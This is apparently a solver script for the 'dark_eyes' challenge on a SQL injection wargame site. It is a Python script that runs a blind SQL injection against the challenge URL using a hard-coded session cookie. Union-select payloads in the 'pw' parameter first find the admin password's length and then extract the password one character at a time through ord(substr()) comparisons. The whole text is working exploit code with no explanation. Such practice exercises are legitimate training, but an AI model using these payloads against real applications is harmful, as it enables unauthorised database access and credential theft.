import requests
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"

cookie = {'PHPSESSID' : 'ovbfdu14h0vaeamskdlr10nttu'}

for len in range(100):
  param = {'pw': f"' or id='admin' and pw=(select 1 union select length(pw) = {len})#"}
  res = requests.get(url=url, params=param, cookies=cookie)
  if "select id from prob_dark_eyes where" in (res.text):
    print(len)
    break

length = 8
password = ""
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    param = {'pw':f"' or id='admin' and pw=(select 1 union select ord(substr(pw,{str(len)},1))={str(pw)})#"}
    res = requests.get(url=url, params=param, cookies=cookie)
    if "select id from prob_dark_eyes where" in (res.text):
      password += chr(pw)
      break
        
print(password.lower())